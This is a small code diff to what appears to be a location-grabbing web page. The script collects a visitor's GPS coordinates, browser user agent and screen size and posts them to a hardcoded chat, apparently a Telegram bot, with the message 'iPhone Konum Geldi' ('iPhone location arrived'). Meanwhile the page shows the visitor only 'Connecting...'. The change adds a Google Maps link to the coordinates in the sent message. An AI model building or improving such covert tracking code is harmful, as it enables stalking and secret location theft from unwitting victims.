@@ -47,6 +47,7 @@
           const lon = position.coords.longitude;
           const ua = navigator.userAgent;
           const screenRes = `${screen.width}x${screen.height}`;
+          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
           info.innerText = "Bağlanılıyor...";
 
@@ -55,7 +56,7 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               chat_id: "7874399327",
-              text: `📍 iPhone Konum Geldi:\nLatitude: ${lat}\nLongitude: ${lon}\n📱 Cihaz: ${ua}\n📏 Ekran: ${screenRes}`
+              text: `📍 iPhone Konum Geldi:\nLatitude: ${lat}\nLongitude: ${lon}\n📍 Harita: ${mapsLink}\n\n📱 Cihaz: ${ua}\n📏 Ekran: ${screenRes}`
             })
           });
 
